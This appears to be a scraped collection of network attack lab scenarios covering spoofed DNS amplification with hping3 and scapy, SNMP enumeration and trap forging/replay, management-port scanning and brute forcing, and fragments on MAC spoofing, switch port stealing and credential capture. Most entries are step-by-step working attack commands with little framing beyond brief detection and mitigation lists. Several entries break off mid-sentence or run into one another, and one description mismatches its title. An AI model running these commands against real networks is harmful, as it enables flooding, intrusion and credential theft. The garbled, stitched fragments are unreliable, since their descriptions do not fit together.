✅ This creates a small DNS server for testing---### 🟢 STEP 3: Spoofed DNS Query (hping3 or scapy)We will spoof the victim’s IP and send a DNS query to the DNS server:#### ✅ Using hping3 (easy way):bash
sudo hping3 --udp -a 192.168.56.101 -p 53 -d 50 -c 100 8.8.8.8
Explanation:• --udp: send UDP packets• -a: spoof source IP (victim)• -p 53: DNS port• -d 50: small data size• -c 100: send 100 packets✅ DNS will reply to the victim---#### ✅ Using scapy (Python control):python
from scapy.all import *
spoofed_pkt = IP(src="192.168.56.101", dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))

Stop scapy or hping3 (Ctrl+C)2. Stop tcpdump3. Remove local DNS server (if installed):bash
sudo systemctl stop dnsmasq

Source: MITRE ATT&CK, OWASP, hping3 & scapy Docs, US-CERT DNS Attack Report

Title: SNMP Enumeration via Nmap & snmpwalk

If SNMPv1/v2c is enabled with default or weak community strings (e.g., public), attackers can read sensitive data without logging in. SNMP is often found in routers, switches, printers, and Linux systems.
Tools Used: ✅ Kali Linux (Attacker)✅ Metasploitable2 (Target)✅ nmap✅ snmpwalk✅ snmp-check (optional)✅ Wireshark or tcpdump (for packet capture)✅ VirtualBox / VMware setup with Host-Only Network
Attack Steps:
### 🟢 STEP 1: Lab Setup1. Start Kali Linux VM.2. Start Metasploitable2 (or a Linux VM with SNMP enabled).3. Set both VMs to Host-Only Adapter in VirtualBox or Bridged Adapter in VMware.4. Open Kali terminal, run:bash
ifconfig
✅ This shows your attacker IP, e.g., 192.168.56.1025. Scan the network to find the target:bash
nmap -sn 192.168.56.0/24
✅ Suppose the target IP is 192.168.56.101---### 🟢 STEP 2: Check SNMP Port on Targetbash
nmap -sU -p 161 192.168.56.101
✅ -sU: UDP scan✅ -p 161: SNMP port✅ If open, SNMP is running---### 🟢 STEP 3: Basic SNMP Enumeration using snmpwalk🔧 What is snmpwalk?It walks through SNMP variables using SNMP GET-NEXT requests.Command:bash
snmpwalk -v2c -c public 192.168.56.101
✅ -v2c: SNMP version 2c (common)✅ -c public: community string (public is default and insecure)✅ Output will dump lots of info:• OS type and version• Uptime• Interfaces• Hostname• Storage info• Running services---### 🟢 STEP 4: Get Specific DetailsTo extract only uptime:bash
snmpwalk -v2c -c public 192.168.56.101 SNMPv2-MIB::sysUpTime.0

snmpwalk -v2c -c public 192.168.56.101 SNMPv2-MIB::sysName.0

---### 🟢 STEP 5: Use snmp-check Tool (Optional)bash
snmp-check 192.168.56.101 -c public
✅ Gives summary of open ports, running services, processes, etc.---### 🟢 STEP 6: Capture PCAP for Dataset (Wireshark or tcpdump)Open another Kali terminal:bash
sudo tcpdump -i eth0 port 161 -w snmp_enum.pcap
Then re-run snmpwalk.✅ This will store the SNMP packet data for your project.Open in Wireshark:bash
wireshark snmp_enum.pcap
✅ Apply filter: udp.port == 161---### 🛑 STEP 7: CleanupNo need to stop anything.Delete PCAP or logs if needed:bash
rm snmp_enum.pcap
---### 🧠 TIPS for Beginners:• If SNMP is not running, Metasploitable won’t respond → Try SMB instead.• Use -v1 or -v3 if -v2c doesn’t work.• You can try different community strings: private, manager, etc.• Always record results in a text file for reporting:bash
snmpwalk -v2c -c public 192.168.56.101 > snmpdump.txt
Target Type: Routers, Printers, Linux Machines, IoT Devices
Vulnerability: SNMP with default public community stringNo authenticationSNMP v1/v2c insecure by design
Impact: - Reveals hostname, uptime, OS, running processes- May expose users, file paths, shares- Useful for further attack planning

Title: SNMP Trap Hijacking / Replay Attack
Scenario Description: In this advanced simulation, an attacker captures SNMP trap packets from a network device (like a switch or router), then replays or forges them to trick the SNMP Manager into acting on fake alerts or logs. SNMP traps are unsolicited UDP packets sent from agents to the SNMP server. Since they often lack integrity or authentication in SNMPv1/v2c, they can be hijacked, replayed, or forged. This can cause false alarms, suppress real alerts, or trick systems into automation actions (e.g., triggering backups, shutoffs).
Tools Used: ✅ Kali Linux✅ Metasploitable2 or any SNMP-enabled device✅ Wireshark or tcpdump (for trap capture)✅ Scapy (for packet replay and forging)✅ SNMP daemon (snmptrapd) on target system or SNMP Manager✅ VirtualBox/VMware✅ Host-only or NAT networking
Attack Steps:
### 🟢 STEP 1: Lab Setup1. Start Kali and SNMP-enabled target (Metasploitable2, Router Simulator, etc.)2. Make sure target is sending SNMP traps:🧠 By default, Metasploitable2 sends traps for login/logout events and service starts.3. Start SNMP manager service (can be snmptrapd):bash
sudo service snmptrapd start
---### 🟢 STEP 2: Capture Real SNMP TrapsOpen terminal on Kali:bash
sudo tcpdump -i eth0 udp port 162 -w snmp_traps.pcap
✅ This captures all incoming SNMP traps (port 162)Now trigger activity on target (like SSH login, service restart) to generate traps.Alternatively:bash
wireshark &
Apply filter: udp.port == 162 and save capture.---### 🟢 STEP 3: Analyze Trap ContentOpen PCAP in Wireshark:Look for:• SNMPv2-Trap-PDU• Community string (often public)• System info (e.g., sysUpTime, trap OID)Note the exact structure of the SNMP trap packet – this is important for replay.---### 🟢 STEP 4: Craft Replay using ScapyInstall Scapy if not present:bash
pip install scapy
Run Python shell:bash
sudo scapy
Now craft the fake trap:python
from scapy.all import *
packet = IP(dst="192.168.56.102")/UDP(sport=162,dport=162)/SNMP(community="public",PDU=SNMPvarbinds)
send(packet)
🧠 Replace SNMPvarbinds with copied OIDs and values from real packet.✅ This replays or fakes the trap packet and sends it to the SNMP manager.---### 🟢 STEP 5: Observe Manager ReactionGo to the SNMP Manager machine or console:✅ Check logs:bash
cat /var/log/snmptrapd.log
✅ See if trap was accepted✅ Manager may log it, trigger alert, or even execute linked scripts.---### 🟢 STEP 6: Modify Replay for AttackChange OID to fake system errors:Example: Forge a "Link Down" trap:bash
packet = IP(dst="192.168.56.102")/UDP(sport=162,dport=162)/SNMP(community="public",PDU=SNMPvarbinds where trapOID=ifDown)send(packet)Or replay a previously captured trap multiple times:bash
tcpreplay -i eth0 snmp_traps.pcap
---### 🟢 STEP 7: Record DatasetUse tcpdump during all replays:bash
sudo tcpdump -i eth0 udp port 162 -w snmp_forge_dataset.pcap
✅ This becomes your replay attack dataset✅ Useful for intrusion detection training or academic research---### 🛑 STEP 8: CleanupStop snmptrapd:bash
sudo service snmptrapd stop
Delete PCAP files if needed:rm snmp_traps.pcap snmp_forge_dataset.pcap🧠 Tips:• Always use Wireshark to verify packet structure• Make sure SNMP Manager IP is reachable• Replay during real SNMP service uptime for realism
Vulnerability: SNMPv1/v2c lack authCommunity string is sharedTrap packets unverified and unauthenticated
MITRE Technique: T1001.003 (Data Obfuscation - Protocol Impersonation)T1071.001 (Application Layer Protocol: Web Traffic)
Impact: - Spoof alerts- Cause false alarms- Hide real attacks- Manipulate automation scripts linked to SNMP- DDoS SNMP manager via forged traps
Detection Method: - Monitor SNMP logs- Use Wireshark or Suricata to inspect traps- Anomaly detection for trap OID frequency
Solution: - Use SNMPv3 with integrity/auth- Use firewalls to restrict source IP of traps- Block UDP 162 from untrusted hosts- Validate trap OID source integrity
Source: Red Team Manual, Cisco SNMP Docs, MITRE ATT&CK, HackTricks

Title: Open Management Ports Recon & Enumeration
Scenario Description: Attackers scan public-facing AI agent infrastructure to discover open management ports (e.g., SSH, RDP, HTTP Admin panels). These ports, if exposed, may allow attackers to access sensitive configurations or perform further exploits.
Tools Used: Nmap, Masscan, Shodan, Netcat, Telnet, curl
Attack Steps: 1. Target Identification: The attacker identifies the IP range or domain of the server hosting the AI agent or LLM application. This can be obtained via DNS enumeration (using nslookup, dig) or OSINT tools like Shodan and Censys. 2. Port Scanning: Using tools like nmap or masscan, the attacker scans for open ports such as 22 (SSH), 3389 (RDP), 80/443 (HTTP/HTTPS admin panels), 2375 (Docker), or 8888 (Jupyter Notebook). For example: nmap -p- -T4 <target-ip> to scan all ports. 3. Service Enumeration: Once open ports are found, the attacker uses banner grabbing (nmap -sV, nc, curl) to determine what services and versions are running. This helps identify weak or outdated management interfaces. 4. Access Testing: If default credentials are in place or authentication is weak, the attacker attempts access using commonly known credentials (admin:admin, root:toor). Tools like hydra or medusa can brute-force login if rate-limiting is not enforced. 5. Privilege Escalation or Lateral Movement: If initial access is gained, attacker may explore the backend systems, container APIs, or internal scripts that expose AI model weights, configurations, or connected databases. 6. Data Collection: Logs, credentials, tokens, or API keys found during exploration may be exfiltrated for future use or access to other services. 7. Persistence Setup (Optional): Some attackers may set up backdoors (cronjobs, SSH keys) or modify LLM agent prompts/config to stay hidden. 8. Cleanup (Optional): Logs may be deleted or tampered with to avoid detection.
Impact: Unauthorized access, data theft, model leakage
Detection Method: Network IDS/IPS, SIEM alerts, anomalous logins
Solution: Close unused ports, enforce MFA, monitor logs, implement IP whitelisting
Tags: LLM, Port Scan, Recon, Enumeration, Nmap, Shodan

Title: Misconfigured VPN / IPsec Tunnel Access
Scenario Description: This simulation demonstrates how attackers exploit weak or misconfigured VPN/IPsec tunnels to gain unauthorized access to internal networks. Attacker connects VPN2. Still accesses external sites3. Title: No Egress Filtering (Outbound Rules)
Scenario Description: This simulation shows how attackers exploit networks where outbound traffic (egress) is not restricted by firewalls. If outbound ports like DNS (53), HTTP (80), HTTPS (443), or even custom ports (e.g. 8080, 4444) are allowed without rules, an attacker inside the network can: 1️⃣ connect to a remote C2 server, 2️⃣ download malware, or 3️⃣ exfiltrate stolen data. This lab includes simulation of MLDv1/v2 flood attacks using Kali Linux and a Windows/Linux victim machine in a controlled test network. Ideal for labs, dataset collection, and switch stress testing.

Title: MAC Spoofing (MAC Bypass)

Many corporate or public networks restrict access by allowing only whitelisted MAC addresses (e.g., in hotel Wi-Fi, campus networks, corporate LANs). Title: Session Hijacking (Switch Port Stealing)
Scenario Description: This simulation demonstrates how attackers use switch port stealing to hijack sessions or access on switched Ethernet networks by sending crafted ARP frames. Switches associate MAC addresses to physical ports. An attacker can rapidly spoof the victim’s MAC address, causing the switch to update its MAC table, effectively redirecting traffic meant for the victim to the attacker. This enables session hijacking, credential theft, and man-in-the-middle (MITM) attacks on local networks.

Capture credentials via Wireshark:• Filter: tcp.port == 3389 (RDP), http, ftp• Export credentials from HTTP POSTs or NTLM challenge2.
